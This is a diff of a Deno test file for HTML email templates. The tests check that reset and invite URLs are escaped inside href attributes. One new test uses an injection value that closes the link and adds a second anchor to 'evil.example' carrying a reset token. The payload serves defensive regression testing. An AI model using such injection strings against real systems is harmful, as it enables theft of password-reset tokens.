@@ -16,6 +16,7 @@ import {
   ticketActivityEmailHtml,
   ticketCreatedEmailHtml,
 } from "./templates.ts";
+import { htmlToText } from "./html_to_text.ts";
 
 // ─── inviteEmailHtml ──────────────────────────────────────────────────────
 
@@ -115,6 +116,19 @@ Deno.test("reset: userName escapado", () => {
   });
   assertEquals(html.includes("<img onerror"), false);
   assertStringIncludes(html, "&lt;img onerror=alert&gt;");
+});
+
+// O link de reset leva o token: uma aspa no URL fechava o `href` e deixava
+// injetar um segundo link para fora (roubo do token).
+Deno.test("reset: resetUrl com aspas não sai do atributo href", () => {
+  const html = resetPasswordEmailHtml({
+    userName: "Ana",
+    resetUrl: 'https://painel.mague.pt/"></a><a href="https://evil.example/c?x=/reset?token=t',
+    ttl: "1 hora",
+  });
+  assertEquals(html.includes('<a href="https://evil.example'), false);
+  assertEquals(html.includes('<a href="https://painel.mague.pt/">'), false);
+  assertStringIncludes(html, "https://painel.mague.pt/&quot;&gt;&lt;/a&gt;");
 });
 
 // ─── receiptIssuedEmailHtml ───────────────────────────────────────────────
@@ -433,14 +447,12 @@ Deno.test("aviso de registo: unitDesignation com & escapado (XSS) e sem em-dash"
   assertEquals(html.includes("—"), false);
 });
 
-// ─── URL não-escapada (atributo href) ─────────────────────────────────────
-// As URLs são interpoladas raw em href= (sem escape). Isto é OK porque o
-// caller (templates/sendEmail) controla a URL - não vem de utilizador.
-// Test pinning este contracto: se alguém adicionar escape automático em
-// URL, breaks o teste.
+// ─── URL no atributo href ─────────────────────────────────────────────────
+// A URL leva origin vindo de header (`X-Panel-Base-URL`), por isso é escapada
+// como qualquer atributo. `&amp;` é a forma correta de `&` em HTML: o cliente
+// de email devolve o link original.
 
-Deno.test("invite: acceptUrl é interpolada raw em href (caller-controlled)", () => {
-  // URL com query string complexa (params reais que o sistema gera).
+Deno.test("invite: acceptUrl é escapada no href e decode devolve o link original", () => {
   const url = "https://app/accept-invite?token=abc&next=%2Fhome";
   const html = inviteEmailHtml({
     occupantName: "x",
@@ -449,9 +461,8 @@ Deno.test("invite: acceptUrl é interpolada raw em href (caller-controlled)", ()
     acceptUrl: url,
     ttl: "1h",
   });
-  // O `&` da query string aparece cru no href (não escapado para `&amp;`).
-  // Se a interpolação muda para escape, o link fica partido nos webmails.
-  assertStringIncludes(html, `href="${url}"`);
+  assertStringIncludes(html, `href="https://app/accept-invite?token=abc&amp;next=%2Fhome"`);
+  assertStringIncludes(htmlToText(html), url);
 });
 
 // ─── billingReminderEmailHtml ─────────────────────────────────────────────
